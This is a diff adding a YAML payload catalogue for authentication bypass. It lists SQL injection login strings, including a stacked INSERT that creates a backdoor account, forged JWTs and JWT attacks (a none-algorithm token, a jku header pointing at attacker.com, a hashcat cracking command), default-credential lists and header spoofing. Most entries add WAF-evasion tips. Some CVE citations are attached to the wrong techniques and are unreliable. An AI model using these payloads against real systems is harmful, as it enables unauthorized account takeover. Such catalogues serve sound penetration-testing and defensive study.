@@ -1,0 +1,403 @@
+slug: auth-bypass
+name: Authentication Bypass
+owasp: A07:2021 – Identification and Authentication Failures
+description: 'Authentication bypass vulnerabilities allow attackers to gain access to application functionality without valid
+  credentials. These include flaws in password comparison logic, JWT validation, OAuth flows, multi-factor authentication,
+  and session management. Successful exploitation grants unauthorized access to user or administrator accounts without knowing
+  the correct password.
+
+  '
+severity_range:
+  low: CVSS 6.5
+  high: CVSS 9.8
+references:
+- label: OWASP Authentication Cheat Sheet
+  url: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
+- label: PortSwigger Authentication Research
+  url: https://portswigger.net/web-security/authentication
+groups:
+- slug: sql-auth-bypass
+  name: SQL Injection Authentication Bypass
+  description: Using SQL injection in login forms to bypass credential validation.
+  difficulty: low
+  prerequisites:
+  - Login form vulnerable to SQL injection
+  - Credentials checked via dynamic SQL query
+  payloads:
+  - id: auth-sql-001
+    title: Classic admin comment bypass
+    payload_string: admin'--
+    how_it_works: 'When the login SQL query is constructed as: SELECT * FROM users WHERE username=''INPUT'' AND password=''INPUT'',
+      injecting admin''-- makes the query: WHERE username=''admin''--'' AND password=''x''. The double-dash comments out the
+      password check entirely. The query returns the admin user''s row, bypassing authentication without knowing the password.
+      This is the most common and well-known SQL injection authentication bypass technique and is the first test on any SQL-backed
+      login form.
+
+      '
+    prerequisites:
+    - SQL injection in username field
+    - Admin user exists with username 'admin'
+    waf_bypass_notes: 'admin''-- is heavily signatures; use admin''/*comment*/ or admin'' #'
+    severity_context: CVSS 9.8 – full admin authentication bypass
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - sql-injection
+    - comment-bypass
+    - admin
+    - basic
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-sql-002
+    title: OR tautology any user
+    payload_string: ''' OR 1=1--'
+    how_it_works: 'Adding OR 1=1 to the WHERE clause makes the entire condition true for every row. The query returns the
+      first user in the database, typically an admin. The attacker is logged in as that first user without knowing any credentials.
+      The double-dash comments out any remaining conditions. This is less targeted than specifying a username but works even
+      when the admin username is unknown.
+
+      '
+    prerequisites:
+    - SQL injection in username or password field
+    - Application logs in as the first returned user
+    waf_bypass_notes: OR 1=1 is heavily WAF-detected; try OR 'a'='a' or OR 2>1
+    severity_context: CVSS 9.8 – authentication bypass as first database user
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - sql-injection
+    - or-tautology
+    - any-user
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-sql-003
+    title: Password field bypass
+    payload_string: ''' OR ''1''=''1'
+    how_it_works: 'When injecting into the password field with a known username, the injected OR condition makes the password
+      comparison always true. The query becomes: WHERE username=''admin'' AND password='''' OR ''1''=''1''. The OR makes the
+      entire WHERE clause evaluate to true for the admin user regardless of the stored password. This allows logging in as
+      any known user without the correct password.
+
+      '
+    prerequisites:
+    - SQL injection in password field
+    - Known valid username (e.g., admin)
+    waf_bypass_notes: Password field injection; username is valid; OR makes password irrelevant
+    severity_context: CVSS 9.8 – login as known user without correct password
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - sql-injection
+    - password-field
+    - known-user
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-sql-004
+    title: UNION-based user impersonation
+    payload_string: ''' UNION SELECT 1,''admin'',''known_hash'',''admin@example.com'',1--'
+    how_it_works: 'A UNION SELECT can inject a fake user row into the login query result. The injected row contains known
+      values the attacker controls, including the username and a password hash they know the plaintext for. The application
+      receives this row as the ''authenticated'' user and creates a session. This technique requires knowledge of the query''s
+      column structure but allows impersonating any username, including admin, with a self-chosen password. The column count
+      and types must match the original query.
+
+      '
+    prerequisites:
+    - UNION injection possible in login query
+    - Column structure of users table known
+    waf_bypass_notes: UNION-based; requires column count matching; use NULL for unknown columns
+    severity_context: CVSS 9.8 – UNION injection to impersonate arbitrary user in login
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - sql-injection
+    - union
+    - user-impersonation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-sql-005
+    title: Batch statement auth bypass
+    payload_string: '''; INSERT INTO users(username,password) VALUES(''attacker'',''hash'')--'
+    how_it_works: 'When stacked queries are supported, an attacker can insert a new user into the users table via the login
+      form. The first statement ('') breaks out of the original query, the INSERT creates a new admin-level user with a known
+      password, and the comment suppresses the rest. The attacker then logs in with the newly created account. This technique
+      creates a persistent backdoor account rather than just bypassing a single login attempt.
+
+      '
+    prerequisites:
+    - Stacked queries supported (MSSQL, PostgreSQL)
+    - INSERT privilege on users table
+    waf_bypass_notes: INSERT statement; stacked queries needed; MSSQL most commonly supports this
+    severity_context: CVSS 9.8 – persistent backdoor account creation via login form injection
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - sql-injection
+    - stacked-query
+    - insert
+    - backdoor
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: jwt-bypass
+  name: JWT Authentication Bypass
+  description: Attacks against JSON Web Token validation including algorithm confusion, none algorithm, and secret brute-forcing.
+  difficulty: medium
+  prerequisites:
+  - Application uses JWTs for authentication
+  - JWT validation has implementation weaknesses
+  payloads:
+  - id: auth-jwt-001
+    title: JWT none algorithm
+    payload_string: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+    how_it_works: 'The JWT specification includes ''none'' as a valid algorithm value, intended for unsecured tokens. Some
+      JWT libraries accept tokens signed with the ''none'' algorithm without a signature, treating them as valid. By changing
+      the algorithm in the JWT header to ''none'' and removing the signature, an attacker can forge arbitrary claims. The
+      decoded header is {"alg":"none","typ":"JWT"} and the payload contains admin-level claims. Libraries that don''t explicitly
+      reject ''none'' algorithm accept these forged tokens.
+
+      '
+    prerequisites:
+    - JWT library accepts 'none' algorithm (known vulnerable libraries)
+    - No additional signature validation layer
+    waf_bypass_notes: Library-specific; test with actual JWT; check Accept header in decoded token
+    severity_context: CVSS 9.8 – forged admin JWT via none algorithm bypass
+    cve_refs:
+    - CVE-2015-9235
+    tags:
+    - auth-bypass
+    - jwt
+    - none-algorithm
+    - signature-bypass
+    - token-forgery
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-jwt-002
+    title: JWT algorithm confusion RS256 to HS256
+    payload_string: Sign JWT with HS256 using the server's public key as the HMAC secret
+    how_it_works: 'When a server uses RS256 (asymmetric), its public key is often available. If the JWT library accepts both
+      RS256 and HS256 and doesn''t validate that the algorithm matches the expected type, an attacker signs a token with HS256
+      using the server''s PUBLIC key as the HMAC secret. The server verifies the HS256 signature using what it believes is
+      a shared secret — the same public key. Since the attacker used the public key to sign, the signature verifies. This
+      allows forging arbitrary JWTs against vulnerable implementations.
+
+      '
+    prerequisites:
+    - Server uses RS256; JWT library accepts HS256
+    - Server's public key accessible (JWKS endpoint or certificate)
+    waf_bypass_notes: Algorithm confusion; requires server's public key; use jwt_tool to generate
+    severity_context: CVSS 9.8 – JWT forgery via RS256-to-HS256 algorithm confusion
+    cve_refs:
+    - CVE-2022-21449
+    tags:
+    - auth-bypass
+    - jwt
+    - algorithm-confusion
+    - rs256-hs256
+    - public-key
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-jwt-003
+    title: JWT weak secret brute force
+    payload_string: hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
+    how_it_works: 'HS256 JWT tokens signed with weak or common secrets can be brute-forced offline. The JWT structure includes
+      the signature which is the HMAC of header.payload using the secret. Hashcat mode 16500 handles JWTs natively. With a
+      wordlist like rockyou.txt, common secrets like ''secret'', ''password'', ''jwt_secret'', or company names can be recovered
+      in seconds to hours. Once the secret is known, the attacker can forge arbitrary JWTs with any claims including admin
+      roles.
+
+      '
+    prerequisites:
+    - JWT using HS256/HS384/HS512
+    - Weak or common secret used
+    - JWT token obtainable for offline attack
+    waf_bypass_notes: Offline attack; no application interaction needed once token obtained
+    severity_context: CVSS 8.8 – JWT secret recovery enabling complete token forgery
+    cve_refs:
+    - CVE-2015-9235
+    tags:
+    - auth-bypass
+    - jwt
+    - brute-force
+    - weak-secret
+    - hashcat
+    - offline
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-jwt-004
+    title: JWT kid header path traversal
+    payload_string: '{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}'
+    how_it_works: 'The JWT ''kid'' (key ID) header is used to indicate which key should be used to verify the signature. If
+      the application reads a key file based on the kid value using path concatenation without sanitization, a path traversal
+      in kid causes the server to read an arbitrary file as the signing key. Pointing kid to /dev/null (which reads as empty
+      string on Unix) and signing the JWT with an empty string as the secret causes the server to verify against the empty-string
+      key successfully. This allows arbitrary JWT forgery.
+
+      '
+    prerequisites:
+    - JWT library reads signing key based on kid header
+    - No path traversal sanitization on kid value
+    waf_bypass_notes: kid path traversal; server reads arbitrary file as signing key
+    severity_context: CVSS 9.8 – JWT forgery via kid header path traversal to /dev/null
+    cve_refs:
+    - CVE-2015-9235
+    tags:
+    - auth-bypass
+    - jwt
+    - kid-traversal
+    - path-traversal
+    - empty-secret
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-jwt-005
+    title: JWT jku/x5u header injection
+    payload_string: '{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}'
+    how_it_works: 'The ''jku'' (JWK Set URL) header specifies a URL from which the server should fetch the JSON Web Key Set
+      to verify the token. If the server fetches from this URL without validating that it points to a trusted domain, an attacker
+      can host their own JWKS with their public key, sign the JWT with the corresponding private key, and the server will
+      verify the signature successfully. The x5u header provides the same attack via X.509 certificate URL. This bypasses
+      signature validation entirely.
+
+      '
+    prerequisites:
+    - JWT library fetches key from jku/x5u header without domain validation
+    - Attacker can host JWKS endpoint
+    waf_bypass_notes: Requires attacker-controlled HTTPS endpoint for JWKS hosting
+    severity_context: CVSS 9.8 – JWT signature bypass via attacker-hosted JWK Set
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - jwt
+    - jku-injection
+    - jwks
+    - key-confusion
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: misc-auth-bypass
+  name: Miscellaneous Authentication Bypass
+  description: Authentication bypass via default credentials, forced browsing, password reset flaws, and logic errors.
+  difficulty: low
+  prerequisites:
+  - Application has authentication mechanism
+  payloads:
+  - id: auth-misc-001
+    title: Default credentials probe
+    payload_string: admin:admin, admin:password, admin:admin123, root:root, admin:1234
+    how_it_works: 'Many applications and network devices ship with default credentials that are never changed. Common defaults
+      include admin:admin, admin:password, root:root, and vendor-specific combinations. Automated credential stuffing tools
+      try hundreds of default combinations rapidly. Default credentials are particularly common in IoT devices, network equipment,
+      CMS installations (WordPress admin:admin), database admin interfaces (phpMyAdmin root:root), and enterprise software
+      installed with quick-start guides.
+
+      '
+    prerequisites:
+    - Application has login form
+    - Default credentials not changed during deployment
+    waf_bypass_notes: Rate limiting may apply; try with delay between attempts
+    severity_context: CVSS 9.8 – immediate admin access via unchanged default credentials
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - default-credentials
+    - credential-stuffing
+    - basic
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-misc-002
+    title: Password reset token prediction
+    payload_string: resetToken=1234567890
+    how_it_works: 'If password reset tokens are generated using weak or predictable sources (timestamp, username hash, sequential
+      numbers, PHP rand()), an attacker who observes one token can predict others or brute force the limited token space.
+      Applications using time-based tokens with low entropy can be brute forced within the token''s validity window. This
+      is distinct from token theft — the attacker generates or guesses valid tokens for other users without intercepting them
+      in transit.
+
+      '
+    prerequisites:
+    - Password reset tokens are predictable or have low entropy
+    - Token validation allows multiple attempts without lockout
+    waf_bypass_notes: Offline analysis of token pattern first; then online brute force
+    severity_context: CVSS 8.8 – account takeover via predictable password reset tokens
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - password-reset
+    - token-prediction
+    - weak-entropy
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-misc-003
+    title: MFA bypass via response manipulation
+    payload_string: 'Change response from ''success: false'' to ''success: true'' in MFA step'
+    how_it_works: 'Multi-factor authentication implementations that rely solely on client-side JavaScript or modify response
+      fields to indicate success can be bypassed by intercepting and modifying the MFA verification response. If the application
+      proceeds to the next step based on a response flag (success: true) without server-side session validation, an attacker
+      who intercepts with a proxy can change the MFA response to indicate success. This is a logic flaw in MFA implementation
+      where client-side control flow determines authentication state.
+
+      '
+    prerequisites:
+    - MFA step relies on response manipulation for flow control
+    - Server doesn't verify MFA completion independently
+    waf_bypass_notes: Response manipulation via Burp proxy; no WAF involvement
+    severity_context: CVSS 9.1 – MFA bypass via response tampering
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - mfa-bypass
+    - response-manipulation
+    - logic-flaw
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-misc-004
+    title: Forced browsing to authenticated pages
+    payload_string: GET /admin/dashboard HTTP/1.1 (without authentication cookie)
+    how_it_works: 'Forced browsing tests whether authenticated pages can be accessed without a valid session by directly navigating
+      to known or guessed URLs. When authentication is enforced via client-side redirect (JavaScript) rather than server-side
+      access control, removing the redirect in a proxy allows access. Additionally, some applications check authentication
+      for visible menu items but not for API endpoints or less prominent pages. Path enumeration tools (Gobuster, ffuf) find
+      unprotected authenticated pages.
+
+      '
+    prerequisites:
+    - Authentication enforced client-side only
+    - Server-side access control absent or incomplete
+    waf_bypass_notes: Direct HTTP requests bypass client-side auth redirects
+    severity_context: CVSS 8.8 – unauthorized access to admin functionality via forced browsing
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - forced-browsing
+    - missing-authorization
+    - client-side-only
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: auth-misc-005
+    title: HTTP header authentication bypass
+    payload_string: 'X-Auth-Token: admin
+
+      X-Original-URL: /admin
+
+      X-Forwarded-User: admin'
+    how_it_works: 'Some applications or reverse proxies use custom HTTP headers for authentication, assuming these headers
+      cannot be forged by external clients. If the reverse proxy strips these headers from external requests but an attacker
+      can bypass the proxy and reach the backend directly, or if the proxy allows headers to pass through, headers like X-Auth-Token,
+      X-User, X-Remote-User, or X-Forwarded-User may grant authentication. This is common in microservices architectures where
+      internal services trust headers set by the API gateway.
+
+      '
+    prerequisites:
+    - Application uses custom header for auth instead of session cookies
+    - Backend accessible directly or proxy allows header pass-through
+    waf_bypass_notes: Headers bypass application-level auth if proxy doesn't strip them
+    severity_context: CVSS 9.8 – authentication bypass via custom HTTP header injection
+    cve_refs: []
+    tags:
+    - auth-bypass
+    - http-header
+    - x-forwarded-user
+    - reverse-proxy
+    - microservices
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
